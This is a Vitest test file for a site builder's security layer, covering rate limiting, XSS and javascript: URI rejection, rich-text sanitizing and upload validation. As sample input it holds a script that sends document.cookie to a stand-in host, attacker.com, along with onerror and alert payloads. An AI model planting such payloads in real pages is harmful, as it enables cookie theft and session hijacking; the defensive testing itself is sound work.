import { describe, it, expect, beforeEach } from "vitest";
import { RateLimiter } from "@/lib/security/rate-limiter";
import { validatePageDocument } from "@/builder/schemas/document.schema";
import { localServiceTemplate } from "@/templates/definitions/local-service.template";
import { PageDocument } from "@/types/builder";
import { validateSafeUpload, sanitizeRichTextHTML } from "@/lib/security/safe-upload";
import { componentRegistry } from "@/builder/registry";

describe("Phase 18 & 13: Section 18 Security Requirements & Hardening", () => {
  beforeEach(() => {
    RateLimiter.reset();
  });

  describe("1. Sliding Window Rate Limiting", () => {
    it("permits requests within configured threshold", () => {
      const config = { maxRequests: 3, windowMs: 1000 };

      const req1 = RateLimiter.checkLimit("user-ip-1", config);
      expect(req1.allowed).toBe(true);
      expect(req1.remaining).toBe(2);

      const req2 = RateLimiter.checkLimit("user-ip-1", config);
      expect(req2.allowed).toBe(true);
      expect(req2.remaining).toBe(1);

      const req3 = RateLimiter.checkLimit("user-ip-1", config);
      expect(req3.allowed).toBe(true);
      expect(req3.remaining).toBe(0);
    });

    it("blocks requests exceeding configured threshold", () => {
      const config = { maxRequests: 2, windowMs: 1000 };

      RateLimiter.checkLimit("abusive-ip", config);
      RateLimiter.checkLimit("abusive-ip", config);

      const blocked = RateLimiter.checkLimit("abusive-ip", config);
      expect(blocked.allowed).toBe(false);
      expect(blocked.remaining).toBe(0);
      expect(blocked.retryAfterMs).toBeGreaterThan(0);
    });

    it("resets rate limit store cleanly", () => {
      const config = { maxRequests: 1, windowMs: 1000 };

      RateLimiter.checkLimit("test-ip", config);
      expect(RateLimiter.checkLimit("test-ip", config).allowed).toBe(false);

      RateLimiter.reset("test-ip");
      expect(RateLimiter.checkLimit("test-ip", config).allowed).toBe(true);
    });
  });

  describe("2. Injection & XSS Attack Vector Protection", () => {
    it("blocks XSS attack vectors via Zod document validator", () => {
      const maliciousDoc: PageDocument = {
        ...localServiceTemplate.pages[0],
        page: {
          ...localServiceTemplate.pages[0].page,
          title: "<script>alert('xss')</script> Austin Plumbing",
        },
      };

      const result = validatePageDocument(maliciousDoc);
      expect(result.success).toBe(false);
      expect(result.error).toContain("Script tags are forbidden");
    });

    it("blocks javascript: URI injection in document strings", () => {
      const maliciousDoc: PageDocument = {
        ...localServiceTemplate.pages[0],
        page: {
          ...localServiceTemplate.pages[0].page,
          title: "javascript:alert('xss')",
        },
      };

      const result = validatePageDocument(maliciousDoc);
      expect(result.success).toBe(false);
      expect(result.error).toContain("javascript: URIs are forbidden");
    });

    it("sanitizes dangerous HTML tags and inline event handlers from rich-text", () => {
      const dirty = '<p>Hello <script>fetch("https://attacker.com?steal=" + document.cookie)</script><img src="x" onerror="alert(1)"/> world</p>';
      const clean = sanitizeRichTextHTML(dirty);

      expect(clean).not.toContain("<script>");
      expect(clean).not.toContain("onerror");
      expect(clean).toContain("<p>Hello <img src=\"x\"/> world</p>");
    });
  });

  describe("3. Safe Uploads & Sandbox Execution Enforcement", () => {
    it("strictly forbids arbitrary customer PHP, executable scripts, and shell files", () => {
      const phpUpload = validateSafeUpload({
        filename: "malicious_backdoor.php",
        mimeType: "application/x-php",
        sizeBytes: 1024,
      });
      expect(phpUpload.valid).toBe(false);
      expect(phpUpload.error).toContain("Arbitrary executable script uploads are strictly forbidden");

      const exeUpload = validateSafeUpload({
        filename: "trojan.exe",
        mimeType: "application/octet-stream",
        sizeBytes: 2048,
      });
      expect(exeUpload.valid).toBe(false);
    });

    it("strictly allows verified image formats under 5MB", () => {
      const validJpg = validateSafeUpload({
        filename: "hero-photo.jpg",
        mimeType: "image/jpeg",
        sizeBytes: 2 * 1024 * 1024,
      });
      expect(validJpg.valid).toBe(true);

      const oversizedJpg = validateSafeUpload({
        filename: "huge-image.png",
        mimeType: "image/png",
        sizeBytes: 8 * 1024 * 1024,
      });
      expect(oversizedJpg.valid).toBe(false);
      expect(oversizedJpg.error).toContain("exceeds the 5MB maximum limit");
    });

    it("sandbox disallows arbitrary unapproved plugin/component execution in Component Registry", () => {
      // In Section 18: "Do not permit arbitrary customer PHP, unrestricted server-side JavaScript, or arbitrary plugin execution"
      const maliciousId = "arbitrary.external.crypto_miner.v1";
      const isApproved = Boolean(componentRegistry[maliciousId]);
      expect(isApproved).toBe(false);
    });
  });
});
